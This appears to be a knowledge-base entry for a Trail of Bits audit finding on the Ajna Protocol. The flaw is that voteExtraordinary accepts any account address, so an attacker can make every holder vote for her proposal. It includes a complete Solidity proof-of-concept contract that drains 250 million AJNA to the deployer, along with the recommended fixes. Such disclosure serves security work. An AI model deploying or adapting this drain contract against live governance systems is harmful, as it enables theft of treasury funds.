---
tags:
  - lang/solidity
  - platform/trailofbits
  - has/github
  - has/poc
  - severity/high
  - sector/governance
  - sector/staking
protocol: "[[Ajna Protocol]]"
auditors:
  - "[[Alexander Remie]]"
report: "https://github.com/trailofbits/publications/blob/master/reviews/2023-04-ajnalabs-securityreview.pdf"
genome:
  - "[[proposal-manipulation]]"
  - "[[direct-drain]]"
  - "[[proposal-state-check]]"
  - "[[vote-delegation-loop]]"
---
# Extraordinary proposal can be used to steal extraordinary amounts of AJNA

- id: 21301
- impact: HIGH
- protocol: [[Ajna Protocol]]
- reporter: Alexander Remie (TrailOfBits)
- source: https://github.com/trailofbits/publications/blob/master/reviews/2023-04-ajnalabs-securityreview.pdf

## Summary


This bug report is about a vulnerability in the ExtraordinaryFunding contract's voteExtraordinary function. The function accepts any address passed in for the account that will place the vote. This means an attacker can create an extraordinary proposal and call voteExtraordinary for each account that has voting power to make the proposal succeed, as long as the minimum threshold is adhered to.

To be able to place votes on both standard and extraordinary proposals, an account must call ajnaToken.delegate(address) to enable the protocol to track their AJNA token balance. If the passed-in address argument is that of the caller, then the caller will be allowed to vote. If a different account's address is passed in, that account will receive the caller’s voting power.

An extraordinary proposal can be voted on by everyone that has voting power. Additionally, any account can place a vote only once, can vote only in favor of a proposal, can vote only with their entire voting power, and cannot undo a vote that has already been placed. An extraordinary proposal succeeds when there are enough votes in favor and the minimum threshold is adhered to.

The exploit scenario is that off-chain, Mallory collects a list of all of the accounts that have voting power. She calculates off-chain the maximum number of AJNA tokens that could be withdrawn if a proposal gathered all of that voting power. Mallory then creates a contract that creates an extraordinary proposal to transfer all of the AJNA tokens to an account she controls, loops through the collected accounts with voting power, and calls GrantFund.voteExtraordinary for each account, followed by a call to GrantFund.executeExtraordinary. Mallory deploys the contract and receives the AJNA tokens.

The recommendations are to replace the account argument in the voteExtraordinary function with msg.sender and to develop a list of invariants for the grant fund system contracts and implement invariant testing to test that they hold.

## Details

## Ajna Protocol Security Assessment

## Difficulty: Medium

## Type: Undefined Behavior

### Target
`ecosystem-coordination/src/grants/base/ExtraordinaryFunding.sol`

### Description
The `ExtraordinaryFunding` contract's `voteExtraordinary` function accepts any address passed in for the account that will place the vote. As a result, an attacker can create an extraordinary proposal and call `voteExtraordinary` for each account that has voting power to make the proposal succeed (as long as the minimum threshold is adhered to).

```solidity
function voteExtraordinary(
    address account_,
    uint256 proposalId_
) external override returns (uint256 votesCast_) {
    votesCast_ = _extraordinaryFundingVote(account_, proposalId_);
}
```
_Figure 6.1: The `voteExtraordinary()` function in ExtraordinaryFunding.sol#L126-L131_

To be able to place votes on both standard and extraordinary proposals, an account must call `ajnaToken.delegate(address)` to enable the protocol to track their AJNA token balance. If the passed-in address argument is that of the caller, then the caller will be allowed to vote (i.e., the caller delegates voting power to himself). On the other hand, if a different account's address is passed in, that account will receive the caller’s voting power (i.e., the caller delegates voting power to another account). To summarize, until an account calls `ajnaToken.delegate(address)`, that account's tokens cannot be used to place votes on any proposals.

An extraordinary proposal can be voted on by everyone that has voting power. Additionally, any account can place a vote only once, can vote only in favor of a proposal, can vote only with their entire voting power, and cannot undo a vote that has already been placed. An extraordinary proposal succeeds when there are enough votes in favor and the minimum threshold is adhered to. There is no minimum amount of time that needs to pass before an extraordinary proposal can be executed after it has gathered enough votes.

### Exploit Scenario
Off-chain, Mallory collects a list of all of the accounts that have voting power. She sums all of the voting power and calculates off-chain the maximum number of AJNA tokens that could be withdrawn if a proposal gathered all of that voting power. Mallory writes a custom contract that, inside the constructor, creates an extraordinary proposal to transfer all of the AJNA tokens to an account she controls, loops through the collected accounts with voting power, and calls `GrantFund.voteExtraordinary` for each account, followed by a call to `GrantFund.executeExtraordinary`. Mallory deploys the contract and receives the AJNA tokens.

```solidity
pragma solidity 0.8.16;

import { IExtraordinaryFunding } from "../src/grants/interfaces/IExtraordinaryFunding.sol";
import { IAjnaToken } from "./utils/IAjnaToken.sol";

contract DrainGrantFund {
    constructor(
        address ajnaToken,
        IExtraordinaryFunding grantFund,
        address[] memory tokenHolders // list of token holders that have voting power
    ) {
        // generate proposal targets
        address[] memory targets = new address[](1);
        targets[0] = ajnaToken;

        // generate proposal values
        uint256[] memory values = new uint256[](1);
        values[0] = 0;

        // generate proposal calldata, attacker wants to transfer 200 million Ajna to herself
        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeWithSignature(
            "transfer(address,uint256)",
            msg.sender,  // transfer ajna to this contract's deployer
            250_000_000 * 1e18
        );

        uint endBlock = block.number + 100_000;
        string memory description = "Extraordinary Proposal by attacker";

        // attacker creates and submits her proposal
        uint256 proposalId = grantFund.proposeExtraordinary(endBlock, targets, values, calldatas, description);

        // attacker is going to make every token holder vote in favor of her proposal
        for (uint i = 0; i < tokenHolders.length; i++) {
            grantFund.voteExtraordinary(tokenHolders[i], proposalId);
        }

        // execute the proposal, transferring the ajna to the attacker (this contract's deployer)
        grantFund.executeExtraordinary(targets, values, calldatas, keccak256(bytes(description)));
    }
}
```
_Figure 6.2: A proof of concept of an attacker contract that creates a proposal and immediately gathers enough votes to make it pass and steal AJNA tokens from the treasury._

### Recommendations
- **Short term**: Replace the `account` argument in the `voteExtraordinary` function with `msg.sender`.
- **Long term**: Develop a list of invariants for the grant fund system contracts and implement invariant testing to ensure they hold.
